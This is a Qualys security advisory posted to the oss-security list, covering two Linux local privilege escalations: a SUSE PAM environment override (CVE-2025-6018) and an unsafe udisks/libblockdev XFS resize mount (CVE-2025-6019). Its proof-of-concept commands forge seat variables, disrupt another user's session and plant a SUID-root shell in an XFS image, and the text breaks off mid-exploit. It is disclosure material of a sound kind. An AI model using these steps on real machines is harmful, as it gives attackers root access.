Received: (qmail 18423 invoked by uid 550); 17 Jun 2025 20:01:12 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 18387 invoked from network); 17 Jun 2025 20:01:11 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=
	content-id:content-transfer-encoding:content-type:date:from
	:message-id:mime-version:subject:to; s=qualyscom; bh=UZ8jchpbEjV
	iCbI+nAbzmz0ak2Hgw61Y2sVhNha74pc=; b=e9No5rCOV8SyeiN+8TXZU+8g6us
	fol89V3AeKbBg08z9n4vsfDfXnQRH6jiF2dQRazIrjEC7D/D7DoGwnZJKKU9Gu4o
	U49e+oBvAvyDltUmUryHOiEmTjb87sNsM1HEL9MCQ/ob6iMNzv1TunlC+zG5j5te
	Tx5fMT2ijJaDu+4xTKirtGvHISqLJ35dFX6CWK6dV7Xa5tfUnaMNdXpAQOegCSrm
	Q9A+mceNBzF8LnbqtnTPFebTm5Uj/rRP/61GJUpylfsHebTC1R0AfWfzDxTyaIXq
	9ljtxBM5qml5hINRisALmvISm2xA2oJdjsQx+lTBDtiQ309jZMHPvVXuD6g==
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=vDyVYh7nIVsU44CwLqk3vItu6qLK6C78cIfCztPejHhJFam4w8AZqJqMht1GoRKwHFDXkALysR8PqFOy4yPI5jp19awwhqkMKVLRdRi2uh7u/gqCenurFrDKqsARQbD7yIyCjXZLNxaoN73XuEubvcPDeHbcWCBbu2uo3DtrwYtEm+ArF3wZBpWeatOMJnATU3FdEUIJqN6AUaBcHEn8tXwhD/imP3AeffItYIaVUKlDHJ01i7UvfuCQCg96IKN05uB0fUEu78LIfX6UvEgRuvn+p4jRCQFca/3+oCOoA9lpmg0a5fc0n7cI2ZWDOTUd2no9DiST2AiIj+rTPVix2A==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=UZ8jchpbEjViCbI+nAbzmz0ak2Hgw61Y2sVhNha74pc=;
 b=JYZAQLMWRAzBpG62yJH+w0XZh7rS0Eg2T8IE5lk5qCodtQAygFrzKmORPczCHbx7RfpBya3xj0CAVp/Krhdzv15bl4AgQdY8klqMewjBKD7b821YFpCXGLPceIh6WQKnBk2MXEJVfwqe5lHeNvtG71Gr+mjrRB+f+wRlPWbGV3mPvdWCiP1kBygaFLX32DD5gqsvP4T8Wq9OLNeJlQNRUKA2HSqqAb4mzKrtqUXjIfxZB6mOZa/CeT8EWSoZ8WERbMBdB7EaaFfiuyxTXdsfLEpAyHwrbWFrbOJLK/QsAL8Amhma8Pr5yU1rJ5osNbPd+RFR5EhUtBUP76Ui5L/zRQ==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=UZ8jchpbEjViCbI+nAbzmz0ak2Hgw61Y2sVhNha74pc=;
 b=H7bzLQ1AZNyDOkWX/509mzKOrlVX4K295nLe9M+bwFcUFnN4aA1g3frgiO3bk/VGOef7cxg4jLIz/eEiSJbHNrajx4jK3jttnpYIJELA+ezc/s1BRxBLvOqlao+bvXGqPiyaybHV6MzqU/hDEdLGcgf61MxlF5KnFvO4UDg0kIajJxRjEhX8bZtTcN47oWtKkGC+kswYkem6NnycsjyFyWsXjyxLa/IgaJtLq0eDRG5W7yJvGI7jpomtTaqEZIKicGt0sXQbXujFC20QT6AGvHGV3tEyGTbktU1XLEJl/OcsllRDqByEjMPvCk8FFdO3caf2vPodv9czs34V8Q7A8g==
From: Qualys Security Advisory <qsa@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: CVE-2025-6019: LPE from allow_active to root in libblockdev via
 udisks
Thread-Index: AQHb38KLlhaUfP6bJE6Eoa5mFKswJw==
Date: Tue, 17 Jun 2025 20:00:59 +0000
Message-ID: <20250617195937.GA14637@localhost.localdomain>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: SJ0PR06MB6910:EE_|CH8PR06MB10974:EE_
x-ms-office365-filtering-correlation-id: 7f66d1f9-a3af-4347-90e1-08ddadd9ae26
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;ARA:13230040|1800799024|366016|376014|38070700018;
x-microsoft-antispam-message-info:
 =?us-ascii?Q?L1bNZyZyeJrkCs+XLGXgHgNxS3sOEmOkJWnF5gfioCAyyrjkmvDxmeLYRiOo?=
 =?us-ascii?Q?thQ3+WexbFCADy34xVfIWjigDlIerekZyQiJ44vCPuTFhLn3/7s/k3Wnhjnz?=
 =?us-ascii?Q?ad9nuyYbXeSrAMc6TQS7+sZbHVbprp97P6LGMInexk84LoZqlzzAvIl16kqt?=
 =?us-ascii?Q?1QwWcQkJCHw/8tUSwREk1kSI6iib3GkkUcyP4Oah9otkeCuBthK6JcBMN3Ey?=
 =?us-ascii?Q?JcWK1zk6qcOB64RW78QJcQcsH6K+3Q9ZLUJTOeaXu8Ma+jmq7jWD0auD/84/?=
 =?us-ascii?Q?nA907GtdWsRA3o9bx6g5dJKwAwldLpCeMs98GoludcMtp/UKK8Jx2a0IuIKx?=
 =?us-ascii?Q?sjYQAsgx4ZBzK92fbLEjmcxnrgnvtzl6xf7JiDWXcUnaRlOnYSzmrmbRZu0V?=
 =?us-ascii?Q?ABxDwv0pJAdioDEco+BP9Di9gjMmxQaLhTOYfnERrudL7whGU8DDOQgVpDx4?=
 =?us-ascii?Q?0fPAToV2G1IkN9VZjLLLGHi5M3vPX5qgSzETz79/Mhz01U3RVgmGmQt4+uvu?=
 =?us-ascii?Q?fEma73W4xB0sXdFYCQo4Gh9OONTKE7I2h2T5NTjna3LXsZ6VJ+FqLVod8Zc8?=
 =?us-ascii?Q?SGw/t1GcuA84YhVrmgfTLBnoEn9sYhroMb5YqIJ6OlhRXyGTEhX0wKfkAWmM?=
 =?us-ascii?Q?NaF9jpR4CM1t1H8ql/Xv3kkue0osaP6ETkDUyYytxRsw/EFgKX/3e+do+s8X?=
 =?us-ascii?Q?V3+sdXabub/aHvEyM40W1Zp4WZo9fqoccM0aZ0f5nqguljYmb2Yc6Dx1LW/h?=
 =?us-ascii?Q?4dHYcbOKjTtIGAGbEZDjsghqAlaafeYhp71t/qSMD5gj2oAPsiWNcmrGKT51?=
 =?us-ascii?Q?8/M82q9NOe8Xp3wJI4KTkY5l+mAhLOrlG2EpJfvtsu2KUahybiSEPlfcguaF?=
 =?us-ascii?Q?15vQV6fROVVhtyJ89yjq17XWLgTMI8plyxb9PvSqDkzOFtGgZa7lbAONwEGs?=
 =?us-ascii?Q?ERhMMiz9lyVOMScAxjm8mX7lJXJf4C/P5Mcld1nOIOB9u1byRJh5S7ZuYIwg?=
 =?us-ascii?Q?A2ugjccIMs8aC7rn+H9R975fwBpDus8i/c03fTvp4OnveoDQwfk3kPkyRl26?=
 =?us-ascii?Q?GZ9Zn2rFWOTAuBuVM7zBermG0WqsM/XWs4hfn/UHqsio6M2NG3XP0Cj0hy4h?=
 =?us-ascii?Q?SVPC6PMRxkKAEZlw7+8DkPxBgsM6Tgpyn7JfzxGLsxVIdnYJGL3nk1EZjLrg?=
 =?us-ascii?Q?lgFaodL+LAeiXdoQiM498dExQHDpm7jfZSA6b1MDZpQ1mkJpn/QxHHlEo8/H?=
 =?us-ascii?Q?IgmbQC9e8jUQmW81VNLNj4YiOhNHO99WZWjLYVxMgOcNU4qGR5OKtOnqV5K0?=
 =?us-ascii?Q?z1mlAOTc/CxTcDZ4APpE839nVqaGmudasWJAnhAYb/WUfJGBwf+2+i+I4dJ5?=
 =?us-ascii?Q?We01C9LiSjEojYjx5QcC32NFHGm+EfPc7mgnp+9WGqDSUDTk4V7vHHsBZskX?=
 =?us-ascii?Q?D7njEGkNqDM=3D?=
x-forefront-antispam-report:
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(366016)(376014)(38070700018);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?us-ascii?Q?x1PM2dinJgNDrfo8v3xuHLx2jDHizIaXSClmR55uXDHvvb2nsrbq1boitmS2?=
 =?us-ascii?Q?cXne7H14jwnw5ediIb3b5m3t2Tn+ZBQI/xJsKl0NcsTBL78QRgsp4XWag46S?=
 =?us-ascii?Q?zokYP30wE3szUcrj3+eTBEkzRPJDmcMrGDC1cRTF8DJ7LEabP5BxTSWxM97J?=
 =?us-ascii?Q?ShHYAiWf0OhTcVek6AIMY5UXjxVGosZbAQX/vDkeqO8VoAaSYkD2CasbzSsr?=
 =?us-ascii?Q?vyhVPy6aNPKZ04t2Kr1rJ467gLuxVe4xnuUTNaDtCGb+yRETFxBzYaYUHXI3?=
 =?us-ascii?Q?Fo1hYZH/5mn6FKb/W5XMm+Yl5F1bAXu7ev2cPCKnyKCSqr1BDL/n9bjt116B?=
 =?us-ascii?Q?KQfDWc3ndld8RHNdWsgcuitqg7944CsRwYURVq8vp+8SV2k+7W+1gqEKl2jV?=
 =?us-ascii?Q?0XpWA8n7yV5INdUZZoSinxgYXOIE8O82Ju/r3gV24pC4Y3dTUZuWeGqRs57H?=
 =?us-ascii?Q?3EfaWsZXZ+kdsB75yaNA4U7RBwZCMvv3cE2kutXf4i/a9SpAGoIYd5cWubxd?=
 =?us-ascii?Q?9LsyNY7L7vpN17wThDOcjQmdWUvRq7gzi7tWbU+GfTd32laWxsyfbwXrSlRc?=
 =?us-ascii?Q?a6Gou1gDD8BHZcXHG8mFOO73mjWWWm55QNlWXCGC+ZmB5TNaDKUT0lTprVOD?=
 =?us-ascii?Q?7GG/7vTLGY21FhgrCMS3+ghCFDa/iF11N0eGp7lBmNa7gaV9Q04yGI77q4ZZ?=
 =?us-ascii?Q?Fm4dnSrcIcUEMyztamMixuDYCHBCpbP9te06Z7o08rW3zff/s7wB+C/Sx2ZA?=
 =?us-ascii?Q?hZUXcNivCy4YrGBbxD7ztm4GsFA4j6aEoWTh0AQ5XdoPigoe4/Wne0k12n+W?=
 =?us-ascii?Q?EsUnY05yWdo239l9skWR1RiFNgyVcBfya5t0tEqj5PUzPZJ9BZu6kgHhVz+L?=
 =?us-ascii?Q?KxS0b7hBm3GtmXJXftKdBWKxg24bUkmjHYLR9v7UhTs26CDLxeatWOexVWIg?=
 =?us-ascii?Q?zQcU1LLPlHaJLj0eySfa5/U+wvrKdSYtJIWYV818xZ8jmUISZfra5wLwyKVa?=
 =?us-ascii?Q?Af9nQPMSuYpTyLNJCUBR27bWY59BfN+UUvbkV4muZdhYbQXLCGXwVMpuQDU5?=
 =?us-ascii?Q?Pr2wgSnro+6yJFUKIKOvwJe2yY36db/+x/O5+CQ1U8cjBF9BqcdLu4Plwd3J?=
 =?us-ascii?Q?04+0oPV6oxamLUrZ+NT0xGtgddRihdtMA8fUAS0fBknvIkokTM/+vrqfwR5/?=
 =?us-ascii?Q?2j1oP/J+mAOMrhdRWVC34GFjpE6M6x40J+AbhNrPHyRrJ2TmGuYdG0rFl0MC?=
 =?us-ascii?Q?zAqrScOKI8FqRyGG0YMF1HJkYQzdsLl46E3NY6IdUYum5mf122FLsCuJPLJ/?=
 =?us-ascii?Q?y4wLp2M5s+LUkgsfVEaCt+WHWo2YxG6E3VZbFAuitOE+pqlz6chc/rtuUooR?=
 =?us-ascii?Q?6YVt+bIcpAwtpEx5BeZ55jR/BSedZSTzIxpSP7zG3ECNMa/amjanNsT+u8tp?=
 =?us-ascii?Q?6SzqtVXhYiOJH0QRaYZdbk6rDDUgs4oyHRgcHrjc6AUZ2fM5Nxi4LhHSg1Di?=
 =?us-ascii?Q?sFbPhywXtpmRHyldp6DOILu0csNdD9nY4NqdaA8N7KKlqMq+N7y+PQ7Ct1e1?=
 =?us-ascii?Q?rRu+/v7mSLHHzB8iIapjJ51EW+V0W1Ej7ywkxNBAKX3ntjsevhXcGJcZQ6nX?=
 =?us-ascii?Q?9/ct+HZAfs7lIzbMDTiKn9o=3D?=
Content-Type: text/plain; charset="us-ascii"
Content-ID: <AC0962CE8DC35D43B5B794F18CDADDEA@namprd06.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 7f66d1f9-a3af-4347-90e1-08ddadd9ae26
X-MS-Exchange-CrossTenant-originalarrivaltime: 17 Jun 2025 20:00:59.7437
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: UheSaV5g00YJ4X9CfzXeVoOF4I/QX4LxG/s6C83vNuEK6LbGN/AkMtFsqFASSwmIljrWYr4/IAVNjct+PijmTKk/FJnSgXkrJIO1jgmpMDY=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: CH8PR06MB10974
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.293,Aquarius:18.0.1099,Hydra:6.0.736,FMLib:17.12.80.40
 definitions=2025-06-17_09,2025-06-13_01,2025-03-28_01
Subject: [oss-security] CVE-2025-6019: LPE from allow_active to root in libblockdev via
 udisks


Qualys Security Advisory

CVE-2025-6018: LPE from unprivileged to allow_active in *SUSE 15's PAM
CVE-2025-6019: LPE from allow_active to root in libblockdev via udisks


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Contents
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Summary
CVE-2025-6018: LPE from unprivileged to allow_active in *SUSE 15's PAM
- Analysis
- Proof of concept
- Digression
CVE-2025-6019: LPE from allow_active to root in libblockdev via udisks
- Analysis
- Proof of concept
Acknowledgments
Timeline


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Summary
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We discovered an LPE vulnerability (a Local Privilege Escalation) in the
PAM configuration of openSUSE Leap 15 and SUSE Linux Enterprise 15: an
unprivileged local attacker (e.g., an attacker who logs in via sshd) can
obtain the privileges of a physical "allow_active" user (i.e., a user
who is physically sitting in front of the computer) and can therefore
perform all the "allow_active yes" polkit actions that are normally
reserved for physical users.

We also discovered another LPE vulnerability in libblockdev, trivially
exploitable via the udisks daemon, which is installed by default on most
Linux distributions: an "allow_active" user (e.g., a physical user, or
an attacker who hijacked the session of a physical user, or an attacker
who first exploited a vulnerability such as CVE-2025-6018 from this
advisory) can obtain the full privileges of the root user.

We usually prefer LPEs from *any* unprivileged user to full root
(instead of an LPE from an "allow_active" user to full root, like this
CVE-2025-6019), but:

- when combined with the first LPE from this advisory (CVE-2025-6018),
  this second LPE (CVE-2025-6019) effectively allows an *unprivileged*
  attacker to obtain full root privileges;

- several high-profile vulnerabilities published recently also require
  the privileges of an "allow_active" user to be successfully exploited;
  for example, the following outstanding write-ups by Rory McNamara,
  Matthias Gerstner, and Attila Szasz:

  https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/
  https://security.opensuse.org/2024/11/26/tuned-instance-create.html
  https://ssd-disclosure.com/ssd-advisory-linux-kernel-hfsplus-slab-out-of-=
bounds-write/

Last-minute update: on May 25, 2025, Pumpkin Chang published a must-read
blog post about D-Bus and Polkit, which is particularly relevant to this
advisory because it contains a trick ("Abuse Rule Limitations") that can
allow an unprivileged local attacker (who logs in via sshd for example)
to obtain the privileges of a physical "allow_active" user; for more
information:

  https://u1f383.github.io/linux/2025/05/25/dbus-and-polkit-introduction.ht=
ml


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
CVE-2025-6018: LPE from unprivileged to allow_active in *SUSE 15's PAM
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

________________________________________________________________________

Analysis
________________________________________________________________________

During our recent work on OpenSSH, we noticed that, when an unprivileged
user logs in via sshd on openSUSE Leap 15 or SUSE Linux Enterprise 15:

- PAM's pam_env module (from Linux-PAM 1.3.0) reads this user's
  ~/.pam_environment file by default (i.e., pam_env's "user_readenv"
  configuration option is 1 by default);

- the pam_env module is called first, by sshd's do_pam_setcred(), as
  part of PAM's "auth" stack (from /etc/pam.d/common-auth);

- the pam_systemd module is called later, by sshd's do_pam_session(), as
  part of PAM's "session" stack (from /etc/pam.d/common-session).

Consequently, an unprivileged attacker who logs in via sshd can force
the pam_env module to add arbitrary variables to PAM's environment (by
first writing them to ~/.pam_environment), and these variables are then
returned to the pam_systemd module by pam_getenv(). In particular, the
pam_systemd module calls pam_getenv() for the XDG_SEAT and XDG_VTNR
variables, which immediately reminded us of Jann Horn's excellent
CVE-2019-3842 in systemd:

  https://bugs.launchpad.net/ubuntu/+source/systemd/+bug/1812316

In a nutshell, by setting XDG_SEAT=3Dseat0 and XDG_VTNR=3D1 in
~/.pam_environment, an unprivileged attacker who logs in via sshd on
openSUSE Leap 15 or SUSE Linux Enterprise 15 can pretend that they are,
in fact, a physical user who is sitting in front of the computer; i.e.,
an "allow_active" user, in polkit parlance.

________________________________________________________________________

Proof of concept
________________________________________________________________________

As a concrete result, such an attacker can then perform all the
"allow_active yes" polkit actions that are normally reserved for
physical users. For example, in the following proof of concept, the
attacker calls systemd-logind's CanReboot() method to determine whether
they are authenticated as an unprivileged "allow_any" user (CanReboot()
returns "challenge") or as a physical "allow_active" user (CanReboot()
returns "yes"):

------------------------------------------------------------------------
attacker# ssh -i id_ed25519 nobody@victim

victim> grep PRETTY_NAME=3D /etc/os-release
PRETTY_NAME=3D"openSUSE Leap 15.6"

victim> id
uid=3D65534(nobody) gid=3D65534(nobody) groups=3D65534(nobody)

victim> cat /usr/share/polkit-1/actions/org.freedesktop.login1.policy
...
        <action id=3D"org.freedesktop.login1.reboot">
                <description gettext-domain=3D"systemd">Reboot the system</=
description>
...
                        <allow_any>auth_admin_keep</allow_any>
                        <allow_inactive>auth_admin_keep</allow_inactive>
                        <allow_active>yes</allow_active>
...

victim> gdbus call --system --dest org.freedesktop.login1 --object-path /or=
g/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
('challenge',)

victim> { echo 'XDG_SEAT OVERRIDE=3Dseat0'; echo 'XDG_VTNR OVERRIDE=3D1'; }=
 > .pam_environment

victim> exit

attacker# ssh -i id_ed25519 nobody@victim

victim> gdbus call --system --dest org.freedesktop.login1 --object-path /or=
g/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
('yes',)
------------------------------------------------------------------------

Last-minute note: SUSE Linux Enterprise Server 15 uses "restrictive"
polkit settings, instead of the "standard" settings; consequently, we
must call CanSuspend() (which is "auth_admin_keep:auth_admin_keep:yes")
instead of CanReboot() (which is "auth_admin_keep") to determine whether
we are authenticated as a physical "allow_active" user or not.

We will explore one easy way to transform this minor LPE (from an
unprivileged user to an "allow_active" user) into a full root LPE, in
the next section of this advisory; but first, a brief digression.

________________________________________________________________________

Digression
________________________________________________________________________

On Debian 12 and Ubuntu 24.04, when an unprivileged user logs in via
sshd, PAM's pam_env module (from Linux-PAM 1.5.x) also reads this user's
~/.pam_environment file, because pam_env's "user_readenv" is explicitly
set to 1 in /etc/pam.d/sshd (it is 0 by default, since Linux-PAM 1.4.0).

However, unlike openSUSE Leap and SUSE Linux Enterprise, Debian and
Ubuntu only call the pam_env module at the very end of PAM's "session"
stack, so this user's arbitrary PAM variables (from ~/.pam_environment)
cannot interfere with the pam_sm_open_session() code of the pam_systemd
module.

Nevertheless, we noticed that, by setting the XDG_SESSION_ID variable
(in ~/.pam_environment) to another user's session id, an unprivileged
local attacker can interfere with the pam_sm_close_session() code of the
pam_systemd module, and hence with this other user's session (mark it as
"closing" instead of "active", and delete its .ref FIFO, for example):

------------------------------------------------------------------------
attacker$ ssh evey@victim
evey@victim's password:=20

victim$ grep PRETTY_NAME=3D /etc/os-release
PRETTY_NAME=3D"Ubuntu 24.04.2 LTS"

victim$ id
uid=3D1001(evey) gid=3D1001(evey) groups=3D1001(evey),100(users)

victim$ ls -l /run/systemd/sessions
total 8
-rw-r--r-- 1 root root 314 May 13 21:25 4
prw------- 1 root root   0 May 13 21:25 4.ref
-rw-r--r-- 1 root root 310 May 13 21:33 6
prw------- 1 root root   0 May 13 21:33 6.ref

victim$ cat /run/systemd/sessions/4
# This is private data. Do not parse.
UID=3D1000
USER=3Dtheadmin
...
STATE=3Dactive
...
FIFO=3D/run/systemd/sessions/4.ref
...

victim$ echo 'XDG_SESSION_ID OVERRIDE=3D4' > .pam_environment

victim$ exit

attacker$ ssh evey@victim
evey@victim's password:=20

victim$ exit

attacker$ ssh evey@victim
evey@victim's password:=20

victim$ ls -l /run/systemd/sessions
total 8
-rw-r--r-- 1 root root 313 May 13 22:13 16
prw------- 1 root root   0 May 13 22:13 16.ref
-rw-r--r-- 1 root root 315 May 13 22:04 4

victim$ cat /run/systemd/sessions/4
# This is private data. Do not parse.
UID=3D1000
USER=3Dtheadmin
...
STATE=3Dclosing
...
TTY=3Dpts/0
TTY_VALIDITY=3Dfrom-utmp
...
------------------------------------------------------------------------

We were unable to transform this interference with pam_systemd's
pam_sm_close_session() into an LPE, but maybe more creative minds will.
In any case, we recommend that all Linux distributions explicitly set
pam_env's "user_readenv" to 0 (if not 0 by default); indeed, and as
highlighted in the latest versions of pam_env's man page:

------------------------------------------------------------------------
user_readenv=3D0|1

Turns on or off the reading of the user specific environment file. 0 is
off, 1 is on. By default this option is off as user supplied environment
variables in the PAM environment could affect behavior of subsequent
modules in the stack without the consent of the system administrator.

Due to problematic security this functionality is deprecated since the
1.5.0 version and will be removed completely at some point in the
future.
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
CVE-2025-6019: LPE from allow_active to root in libblockdev via udisks
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

________________________________________________________________________

Analysis
________________________________________________________________________

Armed with our "unprivileged to allow_active" LPE, we obviously decided
to hunt for an "allow_active to root" LPE, and therefore grepped for
"allow_active yes" polkit actions:

------------------------------------------------------------------------
victim> grep -rl 'allow_active.*yes' /usr/share/polkit-1/actions
/usr/share/polkit-1/actions/org.freedesktop.login1.policy
/usr/share/polkit-1/actions/org.freedesktop.ModemManager1.policy
/usr/share/polkit-1/actions/org.freedesktop.NetworkManager.policy
/usr/share/polkit-1/actions/com.redhat.tuned.policy
/usr/share/polkit-1/actions/org.fedoraproject.FirewallD1.desktop.policy.cho=
ice
/usr/share/polkit-1/actions/org.fedoraproject.FirewallD1.server.policy.choi=
ce
/usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy
------------------------------------------------------------------------

As lovers of filesystems and race conditions, we decided to target the
udisks daemon, which is installed by default on most Linux distributions
and which allows, for example, an "allow_active" user to:

- set up a loop device that is backed by an arbitrary filesystem image
  provided by this user;

- mount this arbitrary loop-backed filesystem.

Naturally, to prevent such an "allow_active" user from trivially
escalating their privileges to full root (by planting a SUID-root
program or a special device in their filesystem image), the udisks
daemon always mounts such a filesystem with the nosuid and nodev flags.

Our initial idea, then, was to trick the udisks daemon into mounting a
loop-backed filesystem without the nosuid and nodev flags, because these
flags cross various layers of complex code before eventually reaching
the kernel, and each of these layers parses and escapes these mount
flags and options differently; for example, to mount an ntfs-3g
filesystem via udisks, these flags and options are:

- first interpreted by the udisks daemon itself;

- then passed to and re-interpreted by the libblockdev;

- then passed to and re-interpreted by the libmount;

- then passed to and re-interpreted by the ntfs-3g program;

- then passed to and re-interpreted by ntfs-3g's internal libfuse;

- and finally passed to and re-interpreted by the kernel itself.

However, as we were reading the code of udisks and libblockdev, we
spotted a much simpler LPE: since 2017, the udisks daemon allows an
"allow_active" user to resize their filesystems; and to resize an XFS
filesystem (via the xfs_growfs program, which is installed by default on
most Linux distributions) the udisks daemon calls the libblockdev, which
temporarily mounts this XFS filesystem in /tmp (if it is not mounted
elsewhere already) but *without* the nosuid and nodev flags.

Consequently, an "allow_active" attacker can simply set up a loop device
that is backed by an arbitrary XFS image (which contains a SUID-root
shell), then request the udisks daemon to resize this XFS filesystem
(which mounts it in /tmp *without* the nosuid and nodev flags), and
finally execute their SUID-root shell (from their XFS filesystem in
/tmp) and therefore obtain full root privileges.

________________________________________________________________________

Proof of concept
________________________________________________________________________

1/ On our own attacker machine, as root, we create an XFS image that
contains a SUID-root shell, and copy it to the victim machine:

------------------------------------------------------------------------
attacker# dd if=3D/dev/zero of=3D./xfs.image bs=3D1M count=3D300

attacker# mkfs.xfs ./xfs.image

attacker# mkdir ./xfs.mount

attacker# mount -t xfs ./xfs.image ./xfs.mount

attacker# cp /bin/bash ./xfs.mount

attacker# chmod 04555 ./xfs.mount/bash

attacker# umount ./xfs.mount

attacker# scp -i id_ed25519 ./xfs.image nobody@victim:
------------------------------------------------------------------------

2/ We log in the victim machine, and make sure that we are authenticated
as an "allow_active" user (if not, it may be necessary to first exploit
another LPE such as CVE-2025-6018 from this advisory):

------------------------------------------------------------------------
attacker# ssh -i id_ed25519 nobody@victim

victim> grep PRETTY_NAME=3D /etc/os-release
PRETTY_NAME=3D"openSUSE Leap 15.6"

victim> id
uid=3D65534(nobody) gid=3D65534(nobody) groups=3D65534(nobody)

victim> gdbus call --system --dest org.freedesktop.login1 --object-path /or=
g/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
('yes',)
------------------------------------------------------------------------

